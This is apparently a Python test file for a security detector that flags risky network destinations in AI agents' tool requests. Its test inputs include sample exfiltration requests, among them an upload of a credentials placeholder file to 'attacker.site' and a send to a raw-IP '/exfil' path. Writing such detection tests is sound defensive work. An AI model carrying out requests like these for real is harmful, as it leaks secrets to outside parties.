from app.security import (
    AgentIdentity,
    ToolRequest,
    ToolCategory,
    ActionType,
    DestinationDetector,
    ThreatType,
    Severity,
)

def test_destination_clean_https():
    detector = DestinationDetector()
    agent = AgentIdentity(name="DestAgent")
    req = ToolRequest(
        agent=agent,
        tool_name="http.request",
        tool_category=ToolCategory.NETWORK,
        action=ActionType.READ,
        target="https://example.com/api/v1",
        destination="https://example.com"
    )

    signals = detector.detect(req)
    assert len(signals) == 0

def test_destination_raw_ip():
    detector = DestinationDetector()
    agent = AgentIdentity(name="DestAgent")
    req = ToolRequest(
        agent=agent,
        tool_name="http.request",
        tool_category=ToolCategory.NETWORK,
        action=ActionType.SEND,
        target="http://192.168.1.50/exfil",
        destination="http://192.168.1.50"
    )

    signals = detector.detect(req)
    assert len(signals) >= 1
    assert signals[0].threat_type == ThreatType.MALICIOUS_DESTINATION
    assert signals[0].severity == Severity.HIGH

def test_destination_suspicious_scheme():
    detector = DestinationDetector()
    agent = AgentIdentity(name="DestAgent")
    req = ToolRequest(
        agent=agent,
        tool_name="file.transfer",
        tool_category=ToolCategory.NETWORK,
        action=ActionType.SEND,
        target="ftp://untrusted.server.com/upload",
        destination="ftp://untrusted.server.com"
    )

    signals = detector.detect(req)
    assert len(signals) >= 1
    assert signals[0].threat_type == ThreatType.MALICIOUS_DESTINATION

def test_destination_sensitive_exfiltration_combination():
    detector = DestinationDetector()
    agent = AgentIdentity(name="ExfilAgent")
    req = ToolRequest(
        agent=agent,
        tool_name="network.upload",
        tool_category=ToolCategory.NETWORK,
        action=ActionType.UPLOAD,
        target="sandbox/sensitive/credentials-placeholder.txt",
        destination="https://attacker.site/drop"
    )

    signals = detector.detect(req)
    assert len(signals) >= 1
    exfil_signals = [s for s in signals if s.threat_type == ThreatType.DATA_EXFILTRATION]
    assert len(exfil_signals) == 1
    assert exfil_signals[0].severity == Severity.CRITICAL
